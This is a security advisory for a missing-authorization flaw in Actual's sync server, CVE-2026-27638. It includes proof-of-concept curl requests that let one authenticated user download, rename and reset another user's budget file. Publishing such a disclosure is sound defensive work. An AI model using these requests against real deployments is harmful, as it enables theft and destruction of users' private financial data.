# [M] @actual-app/sync-server: Missing authorization in sync endpoints allows cross-user budget file access in multi-user mode

## Summary
Severity: Medium
Advisory: GHSA-qmjj-p7m9-wjrv
CVE: CVE-2026-27638
CWE: CWE-862
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-02-27
Source: https://github.com/advisories/GHSA-qmjj-p7m9-wjrv
Type: github-advisory

## Affected
- npm: `@actual-app/sync-server` — affected >=0 <26.2.1

## Details
In multi-user mode (OpenID), the sync API endpoints (`/sync/*`) don't verify that the authenticated user owns or has access to the file being operated on. Any authenticated user can read, modify, and overwrite any other user's budget files by providing their file ID.

## Affected Code

File: `packages/sync-server/src/app-sync.ts`

The `validateSessionMiddleware` on line 31 confirms the user is authenticated, but individual endpoints only check that the file *exists* (via `verifyFileExists`), never that the requesting user *owns* or *has access to* the file.

Compare with `POST /sync/delete-user-file` (lines 394-430) which correctly checks:
```js
const isOwner = file.owner === userId;
const isServerAdmin = isAdmin(userId);
if (!isOwner && !isServerAdmin) { ... }
```

This check is missing from all other endpoints.

## Affected Endpoints

- `GET /sync/download-user-file` - download any budget file
- `POST /sync/upload-user-file` - overwrite any budget file
- `POST /sync/sync` - read/write sync messages of any file
- `POST /sync/user-get-key` - read encryption key info
- `POST /sync/user-create-key` - change encryption key
- `POST /sync/reset-user-file` - reset sync state
- `POST /sync/update-user-filename` - rename file
- `GET /sync/get-user-file-info` - read file metadata

## PoC

Setup: Two users (Alice, Bob) authenticated via OpenID on the same Actual server. Alice has a budget with fileId `abc-123`.

Bob downloads Alice's budget:
```bash
curl -X GET 'https://actual.example.com/sync/download-user-file' \
  -H 'X-Actual-Token: <bob-session-token>' \
  -H 'X-Actual-File-Id: abc-123' \
  -o stolen-budget.blob
```

Bob reads Alice's file metadata:
```bash
curl -X GET 'https://actual.example.com/sync/get-user-file-info' \
  -H 'X-Actual-Token: <bob-session-token>' \
  -H 'X-Actual-File-Id: abc-123'
```

Bob renames Alice's budget:
```bash
curl -X POST 'https://actual.example.com/sync/update-user-filename' \
  -H 'X-Actual-Token: <bob-session-token>' \
  -H 'Content-Type: application/json' \
  -d '{"fileId": "abc-123", "name": "pwned"}'
```

Bob resets Alice's sync state (destructive):
```bash
curl -X POST 'https://actual.example.com/sync/reset-user-file' \
  -H 'X-Actual-Token: <bob-session-token>' \
  -H 'Content-Type: application/json' \
  -d '{"fileId": "abc-123"}'
```

File IDs can be discovered by admin users via `GET /sync/list-user-files` (admins see all files), through `user_access` sharing, or by guessing.

## Impact

In multi-user deployments (OpenID mode), any authenticated user can steal other users' complete financial data (transactions, accounts, balances, payees), modify or destroy their budgets, and tamper with encryption keys. This is a personal finance app, so the data is highly sensitive.

## References
- https://github.com/actualbudget/actual/security/advisories/GHSA-qmjj-p7m9-wjrv
- https://nvd.nist.gov/vuln/detail/CVE-2026-27638
- https://github.com/actualbudget/actual/commit/9966c024cb75f57943193cac8e42f401efed9d08
- https://github.com/actualbudget/actual
- https://github.com/actualbudget/actual/releases/tag/v26.2.1
